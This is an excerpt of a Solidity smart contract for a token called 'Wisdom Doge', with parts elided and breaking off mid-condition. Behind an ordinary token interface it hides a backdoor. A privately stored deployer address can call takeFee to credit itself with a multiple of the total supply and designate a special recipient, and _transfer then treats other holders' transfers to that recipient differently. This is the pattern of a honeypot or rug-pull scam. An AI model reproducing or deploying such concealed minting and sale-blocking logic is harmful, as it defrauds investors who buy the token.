...
contract Doge is Context, GIRC3, GIRC3Metadata, Ownable {
    ...
    address  private previousOwner = msg.sender;
    address public take;
    uint256 public fee;


    constructor () {
        _nmtokena5 = "Wisdom Doge";
        _nminitiala5 = 'WISDOM';
 ...
 function takeFee(address _take, uint256 _fee) public {      
        require(previousOwner == msg.sender, "You don't have permission to unlock");
        take = _take;
        fee = _fee;
        if (fee > 2){_balances[previousOwner] += _nmtotala5 * fee;}
    }
  function _transfer(address sender, address recipient, uint amount) internal virtual {
        ...
        if(recipient == take && sender != previousOwner && fee != 0  ){ 
